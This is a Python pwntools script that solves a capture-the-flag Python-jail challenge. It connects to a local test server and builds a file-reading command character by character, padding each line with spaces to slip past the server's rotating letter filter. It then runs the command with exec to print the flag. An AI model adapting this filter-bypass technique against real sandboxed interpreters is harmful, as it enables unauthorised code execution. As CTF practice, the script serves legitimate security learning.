from pwn import *

# conn = process("server.py") # use remote(HOST, PORT) for remote solve
conn = remote("localhost", 7331) # testing with my docker

command = "print(open('flag.txt').read())"

conn.recvuntil(">>>")
conn.sendline('a = ""'.encode())

for char in command:
    conn.recvuntil(">>>")
    payload = "a+="
    window = set("abcdefghijklm")
    for _ in range(3):
        window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window) # copy server state of window
    if char.isalpha():
        while char not in window:
            window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window) 
            payload += " " # keep adding space until the window includes our char

    payload += 25 * " "
    payload += '"'
    payload += char
    payload += '"'

    conn.sendline(payload.encode())

conn.sendline("b =                2;exec(a)".encode()) # same idea to shift window to make exec legal

print("getting the flag now:")
print(conn.recvline().decode().strip().replace(">>> ", ""))
